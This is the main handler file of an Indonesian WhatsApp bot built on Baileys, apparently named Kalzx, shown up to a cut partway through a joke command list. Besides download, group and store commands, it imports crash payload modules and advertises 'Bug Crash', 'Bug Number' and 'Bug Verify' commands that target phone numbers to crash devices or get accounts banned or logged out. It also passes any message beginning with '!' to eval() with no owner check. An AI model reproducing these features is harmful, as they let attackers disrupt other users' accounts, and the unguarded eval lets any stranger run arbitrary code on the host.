process.on('uncaughtException', console.error)
require('./pengaturan')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageContent, generateWAMessage, downloadContentFromMessage, areJidsSameUser, getContentType } = global.baileys
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const speed = require('performance-now')
const axios = require('axios')
const fsx = require('fs-extra')
const mark = `0@s.whatsapp.net`
const dns = require('dns');
const FormData = require('form-data')
const gtts = require('node-gtts')
const ytdl = require("ytdl-core")
const cheerio = require('cheerio');
const ms = require("ms");
const crypto = require('crypto')
const https = require('https')
const yts = require("yt-search")
const LINODE_API_TOKEN = global.apilinode;
const API_TOKEN = global.apitokendo;
const moment = require('moment-timezone') 
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, formatp, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
/*
╬╬═════════════╬╬╬╬═════════════╬╬╬╬═════════════╬╬
*/
const thumb = "https://telegra.ph/file/e6e7d449e990e15d68ea9.jpg"
const grup = "https://chat.whatsapp.com/KLwRD2szGxT3FopuOIs5Wh"
const qris = "https://telegra.ph/file/0e08e8089aab1c39daa01.jpg"
const pengguna = JSON.parse(fs.readFileSync('./dbm/wihh.json'))
const prem = require("./lib/premium");
let premium = JSON.parse(fs.readFileSync('./dbm/premium.json'));
const xeonverifieduser = JSON.parse(fs.readFileSync('./dbm/wihh.json'))
const ntilink = JSON.parse(fs.readFileSync("./dbm/antilink.json"))
const banned = JSON.parse(fs.readFileSync('./dbm/banned.json'))
const { kalz1 } = require('./dbm/bug/kalz1')
const { kalz2 } = require('./dbm/bug/kalz2')
const { kalz3 } = require('./dbm/bug/kalz3')
const { kalz4 } = require('./dbm/bug/kalz4')
const { kalz5 } = require('./dbm/bug/kalz5')
const { kalz6 } = require('./dbm/bug/kalz6')
const tanda = '➻'
/*
╬╬═════════════╬╬╬╬═════════════╬╬╬╬═════════════╬╬
*/
module.exports = kalz = async (kalz, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.msg.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
/*
╬╬═════════════╬╬╬╬═════════════╬╬╬╬═════════════╬╬
*/
const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'abcdefghijklmnopqrstuvwxyz1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

const pushname = m.pushName || "No Name"

    
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}
/*
╬╬═════════════╬╬╬╬═════════════╬╬╬╬═════════════╬╬
*/
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const botNumber = await kalz.decodeJid(kalz.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await kalz.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : true
const welcmm = m.isGroup ? wlcmm.includes(from) : true
const AntiLink = m.isGroup ? ntilink.includes(from) : true
const Jpm = m.isGroup ? ntilink.includes(from) : false 
const isBan = banned.includes(m.sender)
const isPrem = isCreator ? true : prem.checkPremiumUser(m.sender, premium)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
//const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var stime = Styles(`Selamat Pagi 🌄`)
 }
 if(time2 < "19:00:00"){
var stime = Styles(`Selamat Malam 🌌`)
 }
 if(time2 < "18:00:00"){
var stime = Styles(`Selamat Malam 🌌`)
 }
 if(time2 < "15:00:00"){
var stime = Styles(`Selamat Sore 🌅`)
 }
 if(time2 < "11:00:00"){
var stime = Styles(`Selamat Pagi 🌄`)
 }
 if(time2 < "05:00:00"){
var stime = Styles(`Selamat Pagi 🌄`)
 }
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal2 = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')	
const qtod = m.quoted? "true":"false"
const bii = JSON.parse(fs.readFileSync('./dbm/wihh.json').toString())
const isSeler = [botNumber, ...bii].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const jangan = m.isGroup ? ntilink.includes(m.chat) : false	
/*
╬╬═════════════╬╬╬╬═════════════╬╬╬╬═════════════╬╬
*/
// FUNCTION

const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}

const reply = async(teks) => {kalz.sendMessage(from, {text: teks, mentions: await ments(teks)},{quoted:fcall})}

kalz.autoshalat = kalz.autoshalat ? kalz.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? kalz.user.id : m.sender
	let id = m.chat 
    if(id in kalz.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Hai kak ${pushname},\nWaktu *${sholat}* telah tiba, Saat Berjamaah Di Masjid/Musholah Untuk Laki Laki dan Solat Di Rumah Untuk Perempuan.\n\n*${waktu}*\n_untuk wilayah Kota Bekasi dan sekitarnya._`
    kalz.autoshalat[id] = [
    reply(caption),
    setTimeout(async () => {
    delete kalz.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }

const totalFitur = () =>{
            var mytext = fs.readFileSync("./kalz.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
      

async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return;
            }

            console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
    });
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await kalz.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: fcall })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await kalz.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: fcall })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

async function igdl2(url) {
            let res = await axios("https://indown.io/");
            let _$ = cheerio.load(res.data);
            let referer = _$("input[name=referer]").val();
            let locale = _$("input[name=locale]").val();
            let _token = _$("input[name=_token]").val();
            let { data } = await axios.post(
              "https://indown.io/download",
              new URLSearchParams({
                link: url,
                referer,
                locale,
                _token,
              }),
              {
                headers: {
                  cookie: res.headers["set-cookie"].join("; "),
                },
              }
            );
            let $ = cheerio.load(data);
            let result = [];
            let __$ = cheerio.load($("#result").html());
            __$("video").each(function () {
              let $$ = $(this);
              result.push({
                type: "video",
                thumbnail: $$.attr("poster"),
                url: $$.find("source").attr("src"),
              });
            });
            __$("img").each(function () {
              let $$ = $(this);
              result.push({
                type: "image",
                url: $$.attr("src"),
              });
            });
          
            return result;
          }
//==================================================//
if (!kalz.public) {
if (!m.key.fromMe) return
}
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
kalz.sendPresenceUpdate('available', m.chat)
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m Kalzx BOT \x1b[1;37m]', time, chalk.green(budy || m.mtype), 'Dari', chalk.blue(pushname), 'Di', chalk.yellow(groupName ? groupName : 'Private Chat' ), 'args :', chalk.white(args.length))
            }
            
            const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${global.ownername}`, jpegThumbnail: ""}}}
           

     
// Anti Link

if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await kalz.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return kalz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return kalz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return kalz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await kalz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
kalz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
kalz.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}
function pickRandom(list) {
    return list[Math.floor(list.length * Math.random())]
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: kalz.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, kalz.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
kalz.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('!')) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
//==================================================//
try {
ppuser = await kalz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

let isNumber = x => typeof x === 'number' && !isNaN(x)
let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!isNumber(setting.status)) setting.status = 0
                if (autobio) {
        let _uptime = process.uptime() * 1000
		let uptime = clockString(_uptime)
		await kalz.updateProfileStatus(`${botname} | Aktif Selama ${uptime} ⏰ | Mode : ${kalz.public ? 'Public-Mode' : 'Self-Mode'}`).catch(_ => _)
        }
if (autoread) {
kalz.readMessages([m.key])
        }
            } else global.db.data.settings[botNumber] = {
                status: 0,
                autobio: false,
                autoread: false
            }

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

function pickMoji(list) {
     return list[Math.floor(Math.random() * list.length)]
  }

async function falseR () {
kalz.sendReact(m.chat, '❌', m.key)
}

async function loading () {
var kalzx = [ 
 '█▒▒▒▒▒▒▒▒▒10%',
 '████▒▒▒▒▒▒30%',
 '█████▒▒▒▒▒50%',
 '████████▒▒80%', 
 '██████████100%', 
 '⋘ 𝑙𝑜𝑎𝑑𝑖𝑛𝑔 𝑑𝑎𝑡𝑎... ⋙',
 '⋘ 𝑃𝑙𝑒𝑎𝑠𝑒 𝑤𝑎𝑖𝑡... ⋙',
 '𝐍𝐨𝐰 𝐥𝐨𝐚𝐝𝐢𝐧𝐠. . .',
 `ᴄᴏᴍᴘʟᴇᴛᴇ!`
 ]
let { key } = await kalz.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

for (let i = 0; i < kalzx.length; i++) {
/*await delay(10)*/
await kalz.sendMessage(from, {text: kalzx[i], edit: key });//PESAN LEPAS
}
}

async function kalzdown(kalzx,chat) {
kalz.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${kalzx}.${zawn1}` ,
caption: `${kalzx+ zawn1}`,
}, {quoted: m })
}

const tanda = '➻'

const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "🌠 ZxV Client - Multi Device",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

//BATAS
//==================================================//
switch(command) {
case "menu": {
await loading() 
wek = `
• *INFO BOT*
> ◈ *Nama Bot* : ${global.botname}
> ◈ *Nama Owner* : ${global.ownername}
> ◈ *Runtime* : ${runtime(process.uptime())}

• *INFO PENGGUNA*
> ◈ *Nama* : ${pushname}
> ◈ *Number* : ${m.sender.split('@')[0]}
> ◈ *Status* : ${isCreator? 'Owner✅' : 'User 🌷'} ${kalz.premium ? 'Premium' : 'Free '}
`
let sections = [{
title: 'List Menu',
highlight_label: '© Kalzx',
rows: [
{
title: 'Allmenu 📋',
description: `Display AllMenu`, 
id: '.allmenu'
}, 
{
title: 'Menu Pane 🖥l',
description: `Displays Panel Menu`, 
id: '.panelmenu'
},
{
title: 'Menu Download 📥',
description: `Displays Download Menu`, 
id: '.downloadmenu'
},
{
title: 'Menu Group 👥',
description: `Displays Group Menu`, 
id: '.groupmenu'
},
{
title: 'Menu Store 🛒',
description: `Displays Store Menu`, 
id: '.storemenu'
},
{
title: 'Menu Other ⚔️', 
description: "Displays the Other Menu", 
id: '.othermenu'
}]}, 
{
title: 'Bug Menu 😈',
highlight_label: '© HaikalAja', 
rows: [
{
title: 'Bug Number 📟',
description: "Display Bug Number",
id: '.bugnumber'
},
{
title: 'Bug Verify 📍',
description: "Display Bug Verfify",
id: '.bugverify'
}, 
{
title: 'Bug Crash 🔥', 
description: "Display Bug Crash", 
id: '.bugcrash'
}
]}, 
{
title: 'Khusu Owner ❗',
highlight_label: 'Owner Only ❗', 
rows: [
{
title: 'addpremium ☕', 
description: "Display Add Premium User", 
id: '.addprem'
},
{
title: 'admin 🗿', 
description: 'Display Add Admin Panel', 
id: '.admin'
}]},
{
title: 'Contributor Bot 🤖', 
highlight_label: 'Terimakasih ✨', 
rows: [
{
title: 'Terimkakasih.. 🙏', 
description: 'Thank You For..', 
id: '.tqto'
}, 
{
title: 'Owner Kalzx 😈', 
descriotion: 'Kalzx Nih 😈', 
id: '.owner'
}
]}]

let listMessage = {
    title: 'List Menu',
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
interactiveMessage: proto.Message.InteractiveMessage.create({
video: fs.readFileSync('./gunung.mp4'),
caption: ' ',
gifPlayback: true,
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By WhastApp', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kalz.decodeJid(kalz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: wek
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('© 𝗫-𝗰𝗼𝗱𝗲𝗿 𝗧𝗲𝗮𝗺 𝟮𝟬𝟮𝟰')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `👋 Hai kak${m.sender.split('@')[0]}`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e6e7d449e990e15d68ea9.jpg" 
 } }, { upload: kalz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
  
case 'allmenu': {
const menu = `
⫷ *A L L  M E N U* ⫸

*PANEL MENU*
${tanda} ${prefix}panel
${tanda} ${prefix}addusr
${tanda} ${prefix}addsrv
${tanda} ${prefix}admin
${tanda} ${prefix}delusr
${tanda} ${prefix}delsrv
${tanda} ${prefix}detusr
${tanda} ${prefix}listadmin
${tanda} ${prefix}listusr
${tanda} ${prefix}listsrv
${tanda} ${prefix}reinstall
${tanda} ${prefix}restartsrv
${tanda} ${prefix}ramlist
${tanda} ${prefix}spanel
${tanda} ${prefix}startsrv
${tanda} ${prefix}stopsrv
${tanda} ${prefix}suspend
${tanda} ${prefix}tutorial
${tanda} ${prefix}unsuspend 
${tanda} ${prefix}updatesrv
${tanda} ${prefix}webpanel

*OTHER MENU*
${tanda} ${prefix}cekkhodam
${tanda} ${prefix}ai 
${tanda} ${prefix}addcase
${tanda} ${prefix}delcase
${tanda} ${prefix}listcase
${tanda} ${prefix}getcase 
${tanda} ${prefix}totalfitur
${tanda} ${prefix}public
${tanda} ${prefix}self
${tanda} ${prefix}restart
${tanda} ${prefix}runtime
${tanda} ${prefix}addprem
${tanda} ${prefix}delprem
${tanda} ${prefix}listprem
${tanda} ${prefix}upsw
${tanda} ${prefix}getsw
${tanda} ${prefix}listsw
${tanda} ${prefix}bcgc
${tanda} ${prefix}bcimg
${tanda} ${prefix}sticker
${tanda} ${prefix}payment
${tanda} ${prefix}qc
${tanda} ${prefix}hdr
${tanda} ${prefix}autoread
${tanda} ${prefix}autobio
${tanda} ${prefix}pushkontak2
${tanda} ${prefix}listgc
${tanda} ${prefix}tourl

*DOWNLOAD MENU*
${tanda} ${prefix}ytmp3 <link>
${tanda} ${prefix}ytmp4 <link>
${tanda} ${prefix}tt <link>
${tanda} ${prefix}instagram <link>
${tanda} ${prefix}play <query>
${tanda} ${prefix}spotify <query>
${tanda} ${prefix}tiktok <query>

*GROUP MENU*
${tanda} ${prefix}totag
${tanda} ${prefix}hidetag
${tanda} ${prefix}tagall
${tanda} ${prefix}linkgc
${tanda} ${prefix}resetlinkgc
${tanda} ${prefix}sendlinkgc
${tanda} ${prefix}promote
${tanda} ${prefix}demote
${tanda} ${prefix}kick
${tanda} ${prefix}add
${tanda} ${prefix}pushkontak
${tanda} ${prefix}cekidgc
${tanda} ${prefix}getidgc
${tanda} ${prefix}join

*STORE MENU*
${tanda} ${prefix}batal
${tanda} ${prefix}done
${tanda} ${prefix}listpanel
${tanda} ${prefix}proses
${tanda} ${prefix}reqpanel
${tanda} ${prefix}sewa
${tanda} ${prefix}sewabot
${tanda} ${prefix}spanel
${tanda} ${prefix}tunda
${tanda} ${prefix}testi1
${tanda} ${prefix}testi2
${tanda} ${prefix}testi3
${tanda} ${prefix}testi4
${tanda} ${prefix}testi5

*BUG NUMBER*
${tanda} ${prefix}🔥 62898xxxxx
${tanda} ${prefix}☕ 62898xxxxx
${tanda} ${prefix}🌷 62898xxxxx

*BUG VERIFY*
${tanda} ${prefix}verify 62898xxxx
${tanda} ${prefix}banned 62898xxxx
${tanda} ${prefix}basmi 62898xxxx
${tanda} ${prefix}logout 62898xxxx
${tanda} ${prefix}kenon 62898xxxx

*BUG CRASH*
${tanda} ${prefix}xcrash
${tanda} ${prefix}xioscrash2
${tanda} ${prefix}xcrash
${tanda} ${prefix}xcrash2
${tanda} ${prefix}delaybug
${tanda} ${prefix}pmbug
${tanda} ${prefix}amountbug

_© 𝗫-𝗰𝗼𝗱𝗲𝗿 𝗧𝗲𝗮𝗺 𝟮𝟬𝟮𝟰_
`
     
kalz.sendMessage(m.chat, {
video: fs.readFileSync('./gunung.mp4'),
caption: menu,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: "HaikalAja",
newsletterJid: "120363182916458068@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: `${stime} ${pushname}`,
body: '',
thumbnailUrl: thumb, 
sourceUrl: grup, 
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
}
kalz.sendMessage(m.chat, {audio: fs.readFileSync('./ciscis.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: qevent})     
break

case 'spesan': case 'sendpesan': {
		 if (!isCreator) return reply(`khusus owner operator`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,Pesannya❗`)
            reply('Pesan telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
kalz.sendMessage(mq1, {text:`*───❖》KalzxFluitl《❖───*\nPesan Dari : X-Coder Coporation Tech\n\n${m2}`}, m) 
                 }
            break             

case 'tktk': {
               if (!text) return reply(`Example : ${prefix + command} jj anime`)
    let tts = await (await fetch(`https://api.shannmoderz.xyz/search/tiktok?query=${text}`)).json()
    let shannz = tts.result
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ 𝗞𝗮𝗹𝘇𝘅𝗕𝗼𝘁 - 𝗡𝗲𝘄 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 𝟭.𝟴 ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`𝗞𝗟𝗜𝗞 𝗕𝗨𝗧𝗧𝗢𝗡 𝗨𝗡𝗧𝗨𝗞 𝗡𝗘𝗫𝗧 →`),
                    subtitle: "rorr",
                    hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: shannz.no_watermark }, caption: shannz.title }, { upload: kalz.waUploadToServer }))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"𝗡𝗘𝗫𝗧 ▶️\",\"id\":\".tktk ${text}\"}`
},
 ],
 })
 })
 }
 }
}, {})
await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break


case 'tiktoksearch': case 'tiktok': {
  if (!text) return m.reply('masukkan subjek video!')
  try {
    let tts = await (await fetch(`https://api.shannmoderz.xyz/search/tiktok?query=${text}`)).json()
    let shannz = tts.result
    kalz.sendMessage(m.chat, { video: { url: shannz.no_watermark }, caption: shannz.title },{ quoted: m })
  } catch (err) {
      m.reply('masukkan query lainnya atau coba lagi nanti')
    }
}
break

case 'cekkhodam': {
if (!text) return m.reply("Nama kamu")
  
	const khodam = pickRandom([
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
